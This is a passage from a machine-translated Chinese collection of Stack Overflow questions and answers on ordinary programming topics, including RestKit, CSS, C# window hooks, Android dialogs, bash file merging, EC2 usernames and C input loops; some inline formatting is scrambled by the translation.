> 时间：2012-12-12T19:39:57.777

这对你来说不会很有趣，因为 RestKit 100% 坚持 REST 概念。看一下 RKObjectManager 的代码（[这里是实现](https://github.com/RestKit/RestKit/blob/master/Code/Network/RKObjectManager.m)）。RKObjectManager 是被子类化的，但我知道 RestKit 的创建者 Blake 根据发送的请求的类型进行了大量的调节，因此将它们欺骗到所有 POST 对我来说看起来很危险。

您可以做的仍然是使用 RestKit 中的所有`postObject:`、`deleteObject:`、`patchObject:`等，但将 RK 对`AFNetworking`（HTTPClient 底层）的调用欺骗到所有 POST。

`- (NSMutableURLRequest *)requestWithMethod:path:parameters:`在 RKObjectManager 中查看。

希望这能有所帮助！

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-12T08:20:17.277

您应该直接使用 PATCH 进行更新，使用 DELETE 直接删除，而不是为这两个操作调用 POST。

```
RKObjectManager *manager = [RKObjectManager managerWithBaseURL:[NSURL URLWithString:@"http://restkit.org"];
[manager addRequestDescriptor:requestDescriptor];
[manager addResponseDescriptor:responseDescriptor];

// POST to create
[manager postObject:article path:@"/articles" parameters:nil success:nil failure:nil];

// PATCH to update
article.body = @"New Body";
[manager patchObject:article path:@"/articles/1234" parameters:nil success:nil failure:nil];

// DELETE to destroy
[manager deleteObject:article path:@"/articles/1234" parameters:nil success:nil failure:nil]; 
```

从新的 RestKit Docs检查这个[链接。](https://github.com/RestKit/RestKit#post-patch-and-delete-an-object)

# css - 通过类应用文本颜色在 VisualForce 页面中不起作用

> ID：13822829
> 
> 赞同：2
> 
> 时间：2012-12-11T15:19:04.090
> 
> 标签：css, salesforce, visualforce

我在 VisualForce 页面中观察到一个奇怪的行为。我定义了一个 css 类并将其应用于几个元素，如下所示：

```
<apex:page>
...
<style>
  .lnk
  {
      color:SteelBlue;
      text-decoration:none;
  }
</style>
...
<a class="lnk" href="/{!item.id}/e?retURL=/{!IRM_id}" target="_parent">Edit</a> 
<apex:commandLink styleClass="lnk" action="{!deleteAttachment}" value="Del">
...
</apex:page> 
```

由于某种原因，应用了**文本装饰**样式，但**颜色**没有改变。我对复杂的 css 不是很好，有人可以向我解释这里发生了什么吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:53:12.077

我认为 Salesforce 通过 JS 应用了一些样式，因此正常的执行顺序失败了。通常，您希望首先应用 SF 样式，然后是您自己的添加。当我需要绕过 jQuery 插件附带的一些特定样式时，我也有同样的情况。

您可以尝试[`!important`](http://www.w3.org/TR/CSS21/cascade.html)应用。它对我有用，这是否是正确的做法可能是一个[完全不同的讨论](https://stackoverflow.com/questions/3706819/what-are-the-implications-of-using-important-in-css)......

```
.lnk {
    color: SteelBlue!important;
    text-decoration :none;
} 
```

希望有人会指出一些明显且更简单的东西！

# dns - 通过 ping 查找网关 IP 地址

> ID：13822831
> 
> 赞同：0
> 
> 时间：2012-12-11T15:19:09.820
> 
> 标签：dns, ip

试图把我的头绕在应该相当容易编码的东西上。这个想法是创建一个域名，当在 ping 查找中使用该域时，响应将是您的本地（网关路由器）IP 地址（IP4 和 6）。

因此，当域的 ping 被发送到 DNS 服务器（Web 主机）时，请求数据包将被拉出（包含请求它的原始 IP）并返回您自己的网关 IP。当然会被屏蔽。

基本上是为了方便查找。想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:21:50.693

听起来您正在尝试编写一个始终返回调用者公共 IP 地址的 DNS 服务器。

这是行不通的，因为 DNS 查找要通过一个或多个[递归 DNS 服务器](http://en.wikipedia.org/wiki/Domain_Name_System#Recursive_and_caching_name_server)（例如 ISP DNS 服务器、OpenDNS 或 Google 的 8.8.8.8）。

您的权威服务器不知道最初请求域名的客户端。

# php - 从 DB2 获取表名的特权

> ID：13822833
> 
> 赞同：0
> 
> 时间：2012-12-11T15:19:11.723
> 
> 标签：php, db2, ibm-midrange

我有 2 台具有相同应用程序的服务器，应该是镜像（例如，单独的硬件、单独的数据库，在 AS400 i6 上运行）。每个设置都应该相同。但是在一台服务器上，php函数“*db2_table_privilege*”（或“*db2_tables either*”）返回false（在另一台服务器上它按预期返回结果。（相同的代码，连接被检查为“*db2_server_info*”返回类似的结果两者都有。）谁能告诉我哪个特权是罪魁祸首，因为我认为它必须是一些跳过的设置或许可。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T16:57:29.960

用于查看对象权限的 IBM i 命令是`DSPOBJAUT library/object`，其中您的表是对象名称，模式是库，类型是 *FILE。

如果方案的权限可能不同，请检查`DSPOBJAUT QSYS/library *LIB`，其中 library 是模式名称。

要更改权限，`GRTOBJAUT`、`RVKOBJAUT`或`EDTOBJAUT`。

您还可以查询 SYSIBM/SQLTABLEPRIVILEGES。

# c# - C# 订阅 FormClosing

> ID：13822838
> 
> 赞同：0
> 
> 时间：2012-12-11T15:19:25.187
> 
> 标签：c#, winapi, reflection, window, ipc

当另一个 C# 应用程序（表单）即将关闭时，我想在我的 C# 应用程序中接收一个事件。

我怎样才能做到这一点？这可以用反射来完成吗？

**编辑：详细说明**

我意识到我最初的问题不是很具体。我将尝试更详细地描述我的目标。

所以我有3个应用程序。让我们将它们命名为**Container**、**Placer**和**ToPlace**。我正在用 C# 开发**Contaner**和**Placer**，**Placer**是一个 dll，而**Container**是一个 WinForm。我无权访问**ToPlace**的源代码。在**Container**中，我有一个自定义控件，我在**ToPlace的主窗口中放置了从****Placer**调用的 SetParent 。目标是在关闭**Contaner**应用程序之前恢复**ToPlace**的父窗口，或者过滤掉发送到****ToPlace**主窗口。**最终目标是在Container**退出时不破坏**ToPlace**的主窗口。**

 ******我试图覆盖Container**中自定义控件的 WndProc ，但是没有通过父窗口发送到子窗口的消息。

我还尝试在**Container**应用程序上安装消息过滤器，但这也没有成功。

我在写这个问题之前的最后一次尝试是 SetWindowsHookEx，但是在成功安装钩子后，钩子程序永远不会被调用。也许是因为，我在某处读到，钩子函数必须在 win32 dll 中，而不是在托管的。下一个尝试是使用 SetWinEventHook，我读到了这个，它更容易从 C# 中工作。

我尝试使用 SetWindowsHookEx 的代码如下，也许在 C# 互操作方面更有经验的人会看到一个错误并且可以让它工作：

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace AppMonitor
{
    public class AppMonitor
    {
        private const int WH_GETMESSAGE = 3;
        private const int HC_ACTION = 0;
        private const int PM_NOREMOVE = 0x0000;
        private const int PM_REMOVE = 0x0001;
        private const int WM_QUIT = 0x0012;

        [DllImport("user32.dll")]
        private static extern int SetWindowsHookEx(int idHook, GetMsgProcDelegate lpfn, int hMod, int dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(int hhk);

        [DllImport("user32.dll")]
        private unsafe static extern int CallNextHookEx(int hhk, int nCode, int wParam, void* lParam);

        [DllImport("user32.dll")]
        private static extern int GetWindowThreadProcessId(int hWnd, out int lpdwProcessId);

        [DllImport("kernel32.dll")]
        private static extern int GetLastError();

        private struct Msg {
            public int        hwnd;
            public int        message;
            public int      wParam;
            public int      lParam;
            public int       time;
            public int       pt;
        };

        [DllImport("kernel32.dll")]
        public static extern int LoadLibrary(string dllToLoad);

        public AppMonitor()
        { 
        }

        private int hHook;
        private int hMod;

        public event EventHandler AppClosing;

        private unsafe delegate int GetMsgProcDelegate(int code, int wParam, void* lParam);
        private unsafe GetMsgProcDelegate m_dlgt;

        private unsafe int GetMsgProc(int code, int wParam, void* lParam)
        {
            if (code != HC_ACTION || wParam != PM_REMOVE)
               return CallNextHookEx(this.hHook, code, wParam, lParam);

            Msg* msg = (Msg*)lParam;

            //if (msg.message == WM_QUIT)
            //    OnAppClosing(new EventArgs());

            return CallNextHookEx(this.hHook, code, wParam, lParam);
        }

        protected virtual void OnAppClosing(EventArgs e)
        {
            EventHandler h = AppClosing;
            if (h != null)
            {
                h(this, e);
            }
        }

        public unsafe bool setHook(int hWnd)
        {
            hMod = LoadLibrary("AppMonitor.dll"); //this dll
            int procId = 0;

            int threadId = GetWindowThreadProcessId(hWnd, out procId);
            if (threadId == 0)
                throw new System.Exception("Invalid thread Id");

            m_dlgt = GetMsgProc;
            this.hHook = SetWindowsHookEx(WH_GETMESSAGE, m_dlgt, hMod, threadId);

            if (this.hHook == 0)
                throw new System.Exception("Hook not successfull! Error code: " + GetLastError());

            return this.hHook != 0;
        }

        public bool unSetHook()
        {
            bool result = false;
            if (hHook != 0)
                result = UnhookWindowsHookEx(hHook);
            return result;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:45:03.473

如果您能以某种方式找到您想要监视的进程（通过窗口标题，或者如下例中的“友好”进程名称），则很容易监视它是否关闭。

下面的示例显示了如何监视“记事本”进程以查看它何时关闭：

```
using System;
using System.Diagnostics;

// To test this program:
// (1) Start Notepad.
// (2) Run this program.
// (3) Close Notepad.
// (4) This program should print "Notepad exited".

namespace Demo
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            foreach (var process in Process.GetProcessesByName("notepad"))
            {
                Console.WriteLine("Found a Notepad process to attach to.");
                process.EnableRaisingEvents = true;
                process.Exited += process_Exited;
            }

            Console.WriteLine("Press ENTER to quit.");
            Console.ReadLine();
        }

        private static void process_Exited(object sender, EventArgs e)
        {
            Console.WriteLine("Notepad exited.");
        }
   }
} 
```

如果需要，可以使用 Process.GetProcesses() 枚举计算机上的所有进程，并为每个进程检查 Process.MainWindowTitle 以查看是否找到了所需的进程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:28:30.663

我们在这里谈论多少 IPC？如果它只是一个简单的通知，也许 using`WM_COPYDATA`会起作用。这是这种方法的一个示例：http: [//www.codeproject.com/Articles/17606/NET-Interprocess-Communication](http://www.codeproject.com/Articles/17606/NET-Interprocess-Communication "WM_COPYDATA 示例")

如果有更多或不仅仅是简单的“我正在关闭”消息，则使用命名管道和/或内存映射文件也可能是合适的。命名管道方法的示例在这里：http: [//msdn.microsoft.com/en-us/library/bb546085.aspx](http://msdn.microsoft.com/en-us/library/bb546085.aspx "MSDN 命名管道")

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:29:27.800

不，这不能通过反射来完成。

您提供的信息很少，无法给出具体答案……例如：

*   如果您有两个“正在开发”的过程（即可以更改两者的源代码），那么解决方案可能很容易
    否则它会变得复杂并且可能不可靠

*   如果两个进程都在同一台机器上，那么可以通过挂钩来实现，
    否则您将需要更复杂的实现。

*   如果您只是想被告知表单已关闭，那么这是可能的
    如果您想在其他进程的上下文中执行某些操作，或者甚至自己处理该事件，这非常复杂并且取决于您到底想要什么，这可能是不可能的。 ..

请提供更多详细信息，以便有可能给出具体答案。****

# javascript - 如何在 primefaces jqchart 中配置 seriesDefaults？

> ID：13822839
> 
> 赞同：1
> 
> 时间：2012-12-11T15:19:24.607
> 
> 标签：javascript, jsf, primefaces, jqplot

我过去使用过 jqplot，现在我通过 Primefaces 使用它，但是我似乎找不到将填充 seriesDefaults 的接口。有谁知道该怎么做，因为我需要设置 fillToZero 属性，否则条形图将无法正确显示负值。

我查看了 BaseChartRenderer 并没有看到该选项编码，这可能是其他地方吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T07:41:52.053

`extender`每个图表（jqplot）小部件都有一个名为的属性：

```
<p:barChart ... extender="extFn"/> 
```

通过引入这样的功能，您可以访问`cfg`jqplot 图表的对象：

```
<script type="text/javascript">
    function extFn() {
        this.cfg.seriesDefaults = {
            ....
        };
    } 
```

一些 SO 答案显示了扩展函数的用法：

*   [在 primefaces 饼图中显示小数位](https://stackoverflow.com/a/13092086/407466)
*   [如何更改 p:barChart yaxis-tick 颜色](https://stackoverflow.com/a/13152899/407466)

# linq - 使用方法组给我以下方法或属性之间的调用不明确：

> ID：13822840
> 
> 赞同：1
> 
> 时间：2012-12-11T15:19:26.417
> 
> 标签：linq, delegates, method-group

我想在 Linq 中调用一个简单的方法组，但收到此错误。

`The call is ambiguous between the following methods or properties: 'System.Linq.Enumerable.Select<string,int>(System.Collections.Generic.IEnumerable<string>, System.Func<string,int>)' and 'System.Linq.Enumerable.Select<string,int>(System.Collections.Generic.IEnumerable<string>, System.Func<string,int,int>)'`

```
var num = new [] { "12345", "5432" };

num.Select(Convert.ToInt32); 
```

我知道调用哪个方法之间存在歧义。但是，我的问题是，有没有一种方法可以在**不**正常调用该方法的情况下指定签名。我想通过不必使用 lambda 表达式来节省打字。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:24:14.003

您可以显式转换：

`num.Select((Func<String, Int32>)Convert.ToInt32);`

# php - 在 Symfony2 配置 TreeBuilder 中使用正则表达式验证？

> ID：13822841
> 
> 赞同：3
> 
> 时间：2012-12-11T15:19:31.473
> 
> 标签：php, symfony, configuration

我正在使用 Symfony2 的树构建器，我看到它有一些基本的验证规则，如下所述：http: [//symfony.com/doc/current/components/config/definition.html#validation-rules](http://symfony.com/doc/current/components/config/definition.html#validation-rules)

有没有办法也通过正则表达式进行验证？

这是我目前的做法，但我不确定这是否是“最佳实践”。我要验证的配置项是`root_node`.

**配置.yml**

```
my_bundle:
    root_node: /some/path    # this one is valid 
```

**配置.php**

```
$treeBuilder = new TreeBuilder();
$rootNode = $treeBuilder->root('my_bundle');

$rootNode
    ->children()
        ->scalarNode('root_node')
             ->end()
        ->end()
    ->end();

return $treeBuilder; 
```

**MyBundleExtension.php**

```
$nodePattern = '#/\w+(/w+)*#';
if (! preg_match($nodePattern, $config['root_node'])) {
    throw new \Exception("root_node is not valid: must match the pattern: $nodePattern");
} 
```

所以，我真正追求的是 TreeBuilder 方法：

```
->validate()->ifNotMatchesRegex()->thenInvalid() 
```

或者，如果做不到这一点，则执行我的验证规则的最佳方法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T16:03:04.193

您可以做的是将该`ifTrue`方法与您的自定义函数一起使用。像这样的东西：

```
$rootNode
    ->children()
        ->scalarNode('root_node')
            ->validate()
            ->ifTrue(function ($s) {
                return preg_match('#/\w+(/\w+)*#', $s) !== 1;
            })
                ->thenInvalid('Invalid path')
            ->end()
       ->end()
   ->end(); 
```

请注意我对您的正则表达式所做的轻微修改。

# android - 具有清晰背景的 DialogFragment（未变暗）

> ID：13822842
> 
> 赞同：30
> 
> 时间：2012-12-11T15:19:34.670
> 
> 标签：android, background, android-dialogfragment

我试图让 a 的背景`DialogFragment`完全清楚。

将样式项目设置`android:windowIsFloating`为 true（默认值），`DialogFragment`显示完全符合我的要求，但背景非常暗淡。

通过设置`android:windowIsFloating`为 false，我得到了我想要的清晰背景，但是 DialogFragment 会爆炸到大约 95% 的屏幕，在它周围只留下一个很小的间隙，你可以看到它覆盖的视图。

我已经尝试了很多调整，但似乎无法覆盖这种行为。

我是否需要使用 a`PopupWindow`来实现所需的效果，或者是否有一些我可以覆盖的样式项目？

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2013-07-27T18:14:23.937

对我有用的是调整[DialogFragment](http://developer.android.com/reference/android/app/DialogFragment.html)的`WinowManager.LayoutParams`in ：`onStart()`

```
@Override public void onStart() {
    super.onStart();

    Window window = getDialog().getWindow();
    WindowManager.LayoutParams windowParams = window.getAttributes();
    windowParams.dimAmount = 0.90f;
    windowParams.flags |= WindowManager.LayoutParams.FLAG_DIM_BEHIND;
    window.setAttributes(windowParams);
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2016-09-22T10:50:37.587

创建您自己的自定义对话框扩展`FragmentDailog` 并覆盖此方法

```
@Override
public Dialog onCreateDialog(Bundle savedInstanceState) {
    Dialog dialog = super.onCreateDialog(savedInstanceState);

    //set the dialog to non-modal and disable dim out fragment behind
    Window window = dialog.getWindow();
    window.setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
    window.clearFlags(WindowManager.LayoutParams.FLAG_DIM_BEHIND);
    return dialog;
} 
```

注意：这个答案适用于`DialogFragment`我`BottomSheetDialogFragment`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-11T15:48:35.340

您需要获取 DialogFrament 的句柄（有时在调用 .show 之后），并在 Posted Runnable 中执行此操作：

```
DialogFragment dialog;

...

WindowManagerLayoutParams wlp = dialog.Dialog.Window.Attributes;
wlp.Flags &= ~WindowManagerFlags.DimBehind;
dialog.Dialog.Window.Attributes = wlp; 
```

我从 Aleks G 对[改变屏幕 android 上对话框的位置](https://stackoverflow.com/questions/9467026/change-dialog-position-on-the-screen)的回答中得到它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-04-10T19:59:02.580

甚至更简单的解决方案是更改 DialogFragment 的 onCreate 中的样式：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setStyle(STYLE_NO_FRAME, getTheme());
} 
```

# symfony-2.1 - 用来自 Symfony 2 表单中链接表的翻译标签填充实体的组合框

> ID：13822843
> 
> 赞同：0
> 
> 时间：2012-12-11T15:19:35.213
> 
> 标签：symfony-2.1

我正在尝试从 Symfony 2 形式的实体列表中提供选择，如下所示：

```
$builder->add('users', 'entity', array(
    'class' => 'AcmeHelloBundle:Country',
    'property' => '.....',
)); 
```

问题是该属性是当前语言中国家的标签，所以它应该对语言表进行连接查询。

有没有办法在不使用“query_builder”选项来保持和之间的表单关系的情况下做到这`User`一点`Country`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T08:28:32.460

解决方案是使用“query_builder”选项获取数据（不要忘记“addSelect”），然后使用“property”选项获取第一个翻译：

```
$builder
            ->add('country', 'entity', array(
                'empty_value' => 'Select',
                'label' => 'form.country', 
                'class' => 'MySiteBundle:Pays', 
                'property' => 'fkLibTradG.trads[0].valeur', 
                'query_builder' => function(\Doctrine\ORM\EntityRepository $er) {
                    return $er->createQueryBuilder('p')
                    ->addSelect('tg')
                    ->addSelect('t')
                    ->join('p.fkLibTradG', 'tg')
                    ->join('tg.trads', 't')
                    ->where('t.fkLanguage = :language')
                    ->setParameter('language', 1)
                    ;

               }
            ))
           ; 
```

# c# - 如何使用 FileWatcher 在不同线程中传输文件

> ID：13822844
> 
> 赞同：0
> 
> 时间：2012-12-11T15:19:35.933
> 
> 标签：c#, winforms

我有一个带有文件观察器的表格，他将放置在文件夹中的所有视频文件传输到多个地址。什么是最好的选择，以便在添加多个文件时甚至能够在一个线程中执行每次传输。这是我的代码示例：

```
DockingBarTransferEntities context = new DockingBarTransferEntities();

private void fileSystemWatcher1_Changed(object sender, System.IO.FileSystemEventArgs e)
        {
            IEnumerable<Diretorios> directories = context.Diretorios.ToList();            

            foreach (var destino in directories)
            {
                try
                {
                   Transfere(e.FullPath,Path.GetFileName(e.FullPath),destino);

                }
                catch (Exception ex)
                {
                    textBox1.Text += "Error: " + ex.Message;
                }
            }
        }

        public void Transfere(string fullPath, string name, Diretorios diretorio)
        {           
            try
            {
                if (Directory.Exists(diretorio.Caminho))
                {
                    string fileName = Path.GetFileName(fullPath);
                    fileName = String.Format("{0}\\{1}", diretorio.Caminho, fileName);

                    FileInfo arquivo = new FileInfo(fullPath);

                    arquivo.CopyTo(fileName, true);                  

                }
            }
            catch (Exception ex)
            {

            }
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:32:57.263

它应该像这样简单：

```
Task.Factory.StartNew(() => Transfere(e.FullPath, Path.GetFileName(e.FullPath), destino)); 
```

而不是直接调用`Transfere`。

# actionscript-3 - FlexGlobals.topLevelApplication.parameters 空

> ID：13822846
> 
> 赞同：1
> 
> 时间：2012-12-11T15:19:41.173
> 
> 标签：actionscript-3, flash, apache-flex

我正在将参数传递给 flex 应用程序，如下所示，但它始终显示为空。

```
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%" id="metaplayer">
                <param name="movie" value="multicastplayer.swf" />
                <param name="quality" value="high" />
                <param name="bgcolor" value="#ffffff" />
                <param name="allowScriptAccess" value="sameDomain" />
                <param name="allowFullScreen" value="true" />
                    <param name="group" value="8155" />
                    <param name="password" value="8155" />
                    <param name="type" value="2" />

                    <param name="streamname" value="8155" />
</object> 
```

从 flex 访问它显示为空的任何一种方式。WriteText 只是我在文本框中显示变量的函数。

```
writeText(mx.core.Application.application.parameters.group);
                for (var i:String in FlexGlobals.topLevelApplication.parameters) {
                    writeText( i + ":" + FlexGlobals.topLevelApplication.parameters[i] + "\n");
                } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:25:42.350

对我来说，它适用于这种语法（通过 flasVars" 参数名称传递参数）：

```
<param name="flashVars" value="locale=${language}&localeFallback=en_US" /> 
```

然后在我的 flex 中：

```
 var parameters:Object = Application(FlexGlobals.topLevelApplication).parameters;

 if (parameters.locale) {
     locale = parameters.locale;
 } 
```

您可以在官方网站上找到相关的官方文档：http: [//helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html](http://helpx.adobe.com/flash/kb/pass-variables-swfs-flashvars.html)

顺便说一句，您可以/应该使用[swfObject](http://code.google.com/p/swfobject/)来生成这段 HTML 代码。它处理正确地将参数传递给 SWF。

HIH

# android - 按下设备的后退按钮时从当前意图触发先前的意图

> ID：13822849
> 
> 赞同：0
> 
> 时间：2012-12-11T15:19:44.700
> 
> 标签：android, android-intent

我需要触发上一个活动，以便在更新当前活动中的一些数据后重新加载整个页面。

```
Ex: activity 1 = read data from database, display data
         = press button to proceed to intent 2
activity 2 = update/change data, save to database
         =  press back button of the device
activity 1 = no changes in the data 
```

我认为按下设备的后退按钮会自动重新加载上一个活动/页面，以便再次重新加载所有数据。我不知道如何解决这个问题，因为我是 android 开发新手并且只是在试验。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T15:37:29.287

1）不要在活动中从数据库中读取数据，从数据库中读取数据设置单独的类 2）连接到数据库并读取/写入数据

如果你需要 sorce 告诉我

# linux - 在 bash 脚本中合并两个文本文件

> ID：13822852
> 
> 赞同：2
> 
> 时间：2012-12-11T15:19:48.163
> 
> 标签：linux, bash

我有一个包含以下内容的文本文件（FILE_A.txt）：

```
Content1
Content2
Content3 
```

和其他包含此内容的文本文件 (FILE_B.txt)：

```
A[#]
B[#]
C[#] 
```

我想以这种方式将 FILE_A.txt 和 FILE_B.txt 合并到其他文件（FILE_C.txt）中：

```
A[Content1]
B[Content2]
C[Content3] 
```

我如何在 linux 中使用 bash shell（sed、cut、grep 等）来实现这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:34:47.413

开始了。

```
# awk 'NR==FNR{a[NR]=$0;next;} sub(/#/,a[FNR])' FILE_A.txt FILE_B.txt
A[Content1]
B[Content2]
C[Content3] 
```

**这是如何运作的？**

*   `NR==FNR`- 如果记录号与 FILE 记录号匹配，则导致运行以下语句 - 也就是说，我们当前仅读取第一个 tfile。
*   `{a[NR]=$0;next;}`- 将第一个文件中的值存储在数组中。
*   `sub(/#/,a[FNR])`- 一旦我们在第二个文件中，替换`#`从第一个文件中存储的匹配值。请注意，这不在大括号内，因此将其作为条件进行评估。如果`sub()`语句成功，则打印当前行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-11T15:32:11.700

使用`paste`和`sed`如下：

```
$ paste File_B.txt File_A.txt | sed 's/#]\s*\(.*$\)/\1]/g'
A[Content1]
B[Content2]
C[Content3] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-11T15:42:57.870

以下内容同时读取两个文件，一次一行，并将这些行存储在`$value`and中`$template`。然后，我们使用 bash 的变量子字符串替换将`#`within替换`$template`为`$value`.

```
exec 6<"FILE_B.txt"  # open file for reading and assign file descriptor 6

while read -r value; do  # loop through FILE_A.txt, storing each line as $value
  read -r template <&6   # read a line from FILE_B.txt, store as $template
  echo ${template/\#/$value}  # replace value into the template in place of `#`
done <"FILE_A.txt"

exec 6<&-  # close input file descriptor 6 
```

# ubuntu - SSH EC2 Linux 实例的默认用户名是什么？

> ID：13822855
> 
> 赞同：13
> 
> 时间：2012-12-11T15:19:52.047
> 
> 标签：ubuntu, amazon-ec2

SSH EC2 amazon Linux 实例的默认用户名是什么。我有一个旧实例，我忘记了用户名。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-12-12T12:06:12.600

对于 Amazon Linux，它是`ec2-user`

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2012-12-12T16:12:49.690

对于 Ubuntu 实例，它是`ubuntu`.

# oracle11g - Oracle：导出相关数据

> ID：13822856
> 
> 赞同：2
> 
> 时间：2012-12-11T15:19:53.717
> 
> 标签：oracle11g

我正在寻找一种方法来导出分布在多个表中的相关数据，并将该数据导入另一个模式。我正在使用 Oracle 11g 数据库。

为了简化我的情况，我有表 A、B 和 C，其中 B 在 A 上有一个外键，C 对 B 有一个外键。在 A 中有 1 个条目，我想从 A 中提取与该条目相关的所有条目， B 和 C 并将它们插入另一个模式。请记住，在我的真实世界场景中，它不是 A、B 和 C，而是 102 个单独的表（不要问，不是我的设计；-)）。

我正在寻找的是一种工具，它将使用表之间关系的知识来进行导出，而无需我指定哪些表通过哪些字段连接。

有没有办法做到这一点并保持清醒？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:38:17.720

数据泵将允许您为每个表提供一个谓词以提取数据，因此将每个表与指定要导出相关数据的数据的表相关联是一件“简单”的事情。通常，谓词类似于“customer_id in（从客户中选择 customer_id）。

# c - 计算一个单词被输入的次数

> ID：13822858
> 
> 赞同：2
> 
> 时间：2012-12-11T15:20:01.987
> 
> 标签：c

经过无数次尝试使我的程序正常工作后，我求助于你们。我想制作一个程序来计算输入特定单词的次数。该特定单词已被指定为参数，我试图通过使用 argc 和 argv 来回忆它。然后我希望程序计算我输入一个单词的次数并完成我希望能够输入 #EOF 以便它停止并向我显示结果。这是我迄今为止一直在尝试的。

```
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <string.h>

int main(int argc, char *argv[])
{

int i=0;
char buf[1026]={'\0'};
char *p="#EOF\n";
fgets(buf, sizeof buf, stdin);

while((strcmp(buf, p) !=0) && (fgets(buf, sizeof buf, stdin) != NULL ))
{

   if(strncmp(buf, argv[1], strlen(argv[1])) == 0)
    {
        i++;
    }
}
printf("%d", i);

return 0;
} 
```

我完全没有错误，但也没有真正发生。我确实尝试检查故障在哪里，我发现当我尝试在 if 语句中显示 I 的值时，它的计数非常非常非常快！

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:21:42.330

好吧，第一个问题是 argv[0] 是您的程序的名称；您的参数从 argv[1] 开始。

此外，在将任何内容放入 buf 之前，会调用您的 while 循环。您肯定需要使用不同的循环或预先初始化 buf 以确保您的循环正常运行。

另外，我建议确保您确切知道应该匹配和不应该匹配的内容。您正在根据要搜索的单词的长度进行子字符串比较 (strncmp)，但这是您想要的吗？这将得到子字符串中的单词，但是你想要那个，还是整个单词？此外，用户是否会在每一行或可能出现该单词的句子中键入一个单词？案例重要吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:25:02.940

你的循环应该是：

```
while( fgets(buf, sizeof buf, stdin) != NULL )
{
} 
```

*在*`fgets()`. _ _

请注意，`fgets()`将包括换行符，请参阅[文档](http://linux.die.net/man/3/fgets)。还要注意使用`sizeof`以避免在代码中使用神奇的数字。

如果您希望用户真正键入`#EOF`结束，而不是通过“发送”文件结束信号（Linux 中的`Ctrl`+ ，Windows 中的+ ）来结束输入，这将起作用并导致循环退出，你 msut当然在计算该行中的单词之前与那个进行比较。`D``Ctrl``Z`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:25:59.427

你有一个无限循环。

```
fgets(buf, 1025, stdin); 
```

在上面的代码行中，`fgets()`将从***包括换行符在内的***`stdin`字符串中取出并将其存储到.*`buf`*

 *一个简单的解决方法是将换行符添加到您检查的字符串中：

```
char *p="#EOF\n"; 
```

* * *

其他问题：

1)

```
char buf[1026]; // This should be initialized to an empty string when you start
                // char buf[1026] = {'\0'}; would do it
char *p="#EOF";

while(strcmp(buf, p) !=0) 
```

2）因为您使用了`while()`循环，并且您在获得任何输入之前进行检查，所以您将始终至少输入一次。这可能不是您想要做的。A `do`/`while`循环，或者作为第一步抓取输入会更好。

3)`if(strncmp(buf, argv[0],`如果你想检查你想要的第一个命令行参数，这是检查你的程序的名称`argv[1]`

4）如果您尝试检查第一个命令行参数是否与用户键入的内容相同，则需要：

```
if(strncmp(buf, argv[1], strlen(argv[1])) == 0) 
```

* * *

我正在运行的代码版本：

```
int main(int argc, char *argv[])
{

    int i=0;
    char buf[1026]={'\0'};
    char *p="#EOF\n";
    do
    {
       fgets(buf, 1025, stdin);
       if(strncmp(buf, argv[1], strlen(argv[1])) == 0)
            i++;
    } while (strcmp(buf, p) != 0);
    printf("%d\n", i);
    return 0;
} 
```*

# javascript - 延迟 ajax 或 jquery 调用直到动态图像加载

> ID：13822864
> 
> 赞同：0
> 
> 时间：2012-12-11T15:20:12.717
> 
> 标签：javascript, jquery, html, ajax, facebook-javascript-sdk

> **可能重复：**
> [jQuery Ajax 等到所有图像都加载完毕](https://stackoverflow.com/questions/4774746/jquery-ajax-wait-until-all-images-are-loaded)

```
//var imgURL="http://xxxx.xxx:8084/xxx/largedynamicimagethattakestime
FB.api(
    '/me/photos', 
    'post', 
    {
        message:' coffee',
        url: imgURL        
    }, 
    function(response) {
        if (!response || response.error) {
            alert('Error occured'+response.error);
        } 
        else {
            //...........
        }
    }
); 
```

我只想在完成加载后启动此`fb.api`调用。`var imgURL`有什么方法可以让我在 a 中加载此图像并仅在图像完全加载时`div`调用？`fb.api`也欢迎提供带有图像的按钮来发布此图像。

* * *

